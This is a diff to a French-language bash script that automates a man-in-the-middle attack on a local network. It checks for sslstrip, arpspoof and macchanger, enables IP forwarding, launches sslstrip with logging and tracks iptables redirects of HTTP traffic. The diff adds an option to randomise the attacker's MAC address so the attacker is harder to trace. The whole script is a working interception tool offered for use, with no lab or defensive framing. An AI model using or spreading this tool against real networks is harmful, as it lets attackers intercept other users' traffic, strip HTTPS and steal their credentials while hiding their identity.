@@ -1,7 +1,26 @@
 #!/bin/bash 
 clear
+
 #set -eux
 
+echo "Voulez vous dissimuler votre adresse mac?"
+read repmac
+
+#-----------------------Propostition changement adresse mac--------------
+if [ $repmac = "oui" ]
+	then
+		clear
+		echo "l'adresse mac sera changé lorsque l'interface sera choisis"
+		mac=1
+		sleep 1
+		clear
+	else
+		clear
+		echo "vous avez choisis de ne pas change l'adresse MAC"
+		mac=0
+		sleep 1
+		clear
+fi
 #--------------Début verification que l'utilisateur est root-------------
 check_root=$(id -u)
 if [ $check_root -eq 0 ]
@@ -18,7 +37,7 @@ fi
 #sslstrip
 test=`echo $?`
 echo "Vérification des packages:"
-aptitude show sslstrip | head -n 2 | grep install 1> /dev/null
+which sslstrip 1>/dev/null
 if [ `echo $?` -ne 0 ]
 	then 
 		clear
@@ -31,7 +50,7 @@ if [ `echo $?` -ne 0 ]
 		echo "sslstrip installé"
 	fi
 #arpspoof
-aptitude show sslstrip | head -n 2 | grep install 1> /dev/null
+which arpspoof 1>/dev/null
 if [ `echo $?` -ne 0 ]
 	then 
 		clear
@@ -42,7 +61,19 @@ if [ `echo $?` -ne 0 ]
 		exit
 	else
 		echo "arpspoof installé"
-		
+fi
+#macchanger
+which macchanger 1 >/dev/null
+if [ `echo $?` -ne 0 ]
+	then
+		clear
+	        echo "macchanger doit-être installé, (aptitude install macchanger ;) )"
+	        echo " "
+	        echo "le programme va se terminer"
+	        sleep 3
+	        exit
+	else
+	        echo "macchanger installé"
 fi
 #------------------------Fin de la verification des package necessaire---------------------- 
 #-----------------------Déclaration des fonctions------------------------------------------
@@ -50,29 +81,32 @@ status() {
 	ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk '{print $2}')	
 	if [ -z $ctrl_sslstrip ]
 		then
-			sslstat="sslstrip OFF"
+			sslstat="sslstrip \033[0;31mOFF\033[0m"
 			vssl=0
+			port=0
 		else
-			sslstat="sslstrip ON PID: $ctrl_sslstrip" 
+			sslstat="sslstrip \033[0;32mON\033[0m PID: $ctrl_sslstrip" 
 			vssl=1
 	fi
 	
 	ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 10 | grep -vi "grep"  | awk '{print $2}')
 	if [ -z $ctrl_arpspoof ]
 		then 
-			arpstat="arpspoof OFF"
+			arpstat="arpspoof \033[0;31mOFF\033[0m"
 			varp=0
+			port=0
 		else
-			arpstat="arpspoof ON PID: $ctrl_arpspoof"
+			arpstat="arpspoof \033[0;32mON\033[0m PID: $ctrl_arpspoof"
 			varp=1
 	fi
 	ctrl_iptable=$(iptables -t nat -L | grep "REDIRECT" | grep "dpt:http" | awk '{print $1}')
 	if [ -z $ctrl_iptable ]
 		then
-			iptablestat="iptables OFF"
+			iptablestat="iptables \033[0;31mOFF\033[0m"
 			vip=0
+			port=0
 		else
-			iptablestat="iptables ON"
+			iptablestat="iptables \033[0;32mON\033[0m"
 			vip=1
 	fi
 	clear		
@@ -85,11 +119,15 @@ status() {
 
 
 iptab(){
-if [ -z $1 ] 
+#if [ -z $1 ] 
+if [ $1 -eq 0 ]
 	then
+		echo "check 1"
 		echo " " 
 		echo "Redirection générées par le programme: "
+		iptr="Pas de redirections"
 	else
+		echo "check2"
 		iptr=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep -w "$1")
 		iptd=$(iptables -t nat -L --line-numbers| grep REDIRECT | grep -w "$1" | awk '{print $1}')
 fi
@@ -101,6 +139,21 @@ ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk 
 ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi "grep" |awk '{print $2}')
 }
 
+macc(){
+if [ $1 -eq 1 ]
+	then
+		PreviousMac=$(ifconfig | grep HW | grep $iface | awk '{print $5}')
+		ifconfig $iface down
+		macchanger -r $iface
+		ifconfig $iface up  
+		NewMac=$(ifconfig | grep HW | grep eth0 | awk '{print $5}')
+		clear
+		echo "Ancienne mac= \033[0;32m$PreviousMac\033[0m"
+		echo "Nouvelle mac= \033[0;32m$NewMac\033[0m"
+		sleep 2
+fi 
+}
+
 #----------------------------------Check terminé début du programme-----------------------------------
 sortie=0
 while [ $sortie -eq "0" ]
@@ -108,7 +161,7 @@ while [ $sortie -eq "0" ]
 		echo " "
 		status
 		echo " "
-		iptab
+		iptab $port 
 		echo $iptr
 		echo " "
 		echo " "
@@ -137,6 +190,7 @@ while [ $sortie -eq "0" ]
 						echo "Quel interface souhaitez vous utiliser?:"
 						ifconfig | cut -d " " -f 1 | sed '/^$/d' 
 						read iface
+						macc $mac
 						echo 1 > /proc/sys/net/ipv4/ip_forward &
 						##mise en place de l'écoute en local
 						sslstrip -w sslstrip.log -a -l $port -f 2> /dev/null &
@@ -201,8 +255,8 @@ while [ $sortie -eq "0" ]
 			"3")
 				clear
 				iptables -t nat -D PREROUTING $iptd 2> /dev/null
-				killall arpspoof
-				killall sslstrip
+				killall arpspoof 2>/dev/null	
+				killall sslstrip 2>/dev/null
 				echo "Le programme est en cours d'arrêt"
 				sortie="1"                              
 				;;                                                                  
